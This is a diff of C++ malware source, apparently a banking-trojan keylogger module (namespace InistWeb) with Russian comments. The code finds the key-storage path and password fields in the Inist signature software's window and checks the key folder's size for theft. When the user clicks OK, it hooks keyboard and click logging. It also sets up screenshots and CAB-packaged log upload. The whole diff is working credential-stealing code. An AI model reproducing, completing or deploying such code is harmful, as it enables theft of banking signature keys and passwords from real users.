@@ -30,6 +30,8 @@ namespace InistWeb
 		"Подпись и шифрование",
 		NULL};
 
+	char ClassNameComboBox[] = "Combobox";
+	char ClassNameEdit[] = "Edit";
 
 
  /*	PList hashKeys = 0; //список ключей которые уже сохранили
@@ -102,8 +104,8 @@ namespace InistWeb
         	// Активируем систему
 			PKeyLogSystem S = KeyLogger::SystemByName(InistSystemName);
 			if (S != NULL)
-                KeyLogger::ActivateSystem(S);
-        }
+				KeyLogger::ActivateSystem(S);
+		}
 
     }
 	//------------------------------------------------------------------------
@@ -114,30 +116,40 @@ namespace InistWeb
 		if (ParentWnd == NULL)
 			return false;
 
-
 		// Определяем редактор ввода директории
 
-		HWND PathWnd = (HWND)pFindWindowExA(ParentWnd, 0, "Combobox", 0 );;
+		HWND PathWnd = (HWND)pFindWindowExA(ParentWnd, 0, ClassNameComboBox, 0 );;
 
 
 		// Ище второй комбобокс или первый едит
 		if (PathWnd != NULL)
-			PathWnd = (HWND)pFindWindowExA(ParentWnd, PathWnd, "Combobox", 0 );
+			PathWnd = (HWND)pFindWindowExA(ParentWnd, PathWnd, ClassNameComboBox, 0 );
 		else
-			PathWnd = (HWND)pFindWindowExA(ParentWnd, 0, "Edit", 0 );
+			PathWnd = (HWND)pFindWindowExA(ParentWnd, 0, ClassNameEdit, 0 );
 
 		//Ище окно ввода пароля
-		HWND PassWnd = (HWND)pFindWindowExA(ParentWnd, PathWnd, "Edit", 0 );
+		HWND PassWnd = (HWND)pFindWindowExA(ParentWnd, PathWnd, ClassNameEdit, 0 );
 
 
 		if (PathWnd == NULL || PassWnd == NULL)
 			return false;
 
 		// Добавляем директорию
-		PCHAR Path = GetWndText(PathWnd);
+		PCHAR Path = NULL;
+		DWORD Len = (DWORD)pSendMessageA(PathWnd, WM_GETTEXTLENGTH, 0, 0);
+		if (Len != 0)
+		{
+			Path = STR::Alloc(Len + 1);
+			pSendMessageA(PathWnd, WM_GETTEXT, Len, (LPARAM)Path);
 
-		trimall(Path, 0xA0);
-		StrConcat(Path, "\\");
+			trimall(Path, 0xA0);
+			PCHAR End = STR::End(Path);
+			End--;
+			if (*End != '\\')
+				StrConcat(Path, "\\");
+		}
+
+		DBGINIST( "Inist", "Проверяем хранилище ключей %s", Path);
 
 		// Проверяем правильность папки
 		bool Valid = (DWORD)pGetFileAttributesA(Path) != INVALID_FILE_ATTRIBUTES;
@@ -146,7 +158,12 @@ namespace InistWeb
         	// ОГраничиваем аксимальный разер данных
 			DWORD FolderSize = 0;
 			Valid = SizeFolderLess(Path, 1024*1024*5, &FolderSize);
-        }
+		}
+
+		if (Valid)
+			DBGINIST( "Inist", "Хранилище успешно прошло проверку" );
+		else
+        	DBGINIST( "Inist", "Хранилище ключей отсутствует либо слишком большое" );
 
 		if (Valid)
 		{
@@ -180,6 +197,7 @@ namespace InistWeb
 	// Функия обработки сообщения
 	void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
 	{
+
 		if (Msg->message == WM_LBUTTONUP)
 		{
 			// Отлавливаем нажатие пользователя на кнопке Ok
@@ -218,15 +236,17 @@ namespace InistWeb
                 }
 
 				MakeLog(Parent);
-				
-				filterAll = KeyLogger::AddFilter(S, false, true, "*", "*", FILTRATE_PARENT_WND, LOG_KEYBOARD, 3);
-				if( filterAll )
+
+				if (filterAll == NULL)
 				{
-					filterAll->LogClicks = true;
-				}
+					filterAll = KeyLogger::AddFilter(S, false, true, "*", "*", FILTRATE_PARENT_WND, LOG_KEYBOARD, 3);
+					if( filterAll )
+					{
+						filterAll->LogClicks = true;
+					}
+                }
 			}
         }
-
 	}
 
 	void OnGetLogWnd(LPVOID Sender, HWND &LogWnd)
@@ -247,8 +267,12 @@ namespace InistWeb
 		if( S != NULL )
 		{
 			S->SendLogAsCAB = true;
-			S->TimeMode    = KLG_TIME_MAX;
-			S->TimeValue   = 5*60; // Система будет работать не мение 5-ти минут
+			S->TimeMode    = KLG_TIME_MIN;
+			#ifdef DEBUGCONFIG
+				S->TimeValue   = 1*60;
+			#else
+				S->TimeValue   = 5*60; // Система будет работать не мение 5-ти минут
+			#endif
 			S->MakeScreenShot = true;
 			S->OnMessage = OnMessage;
 //			S->OnActivate = Activeted;
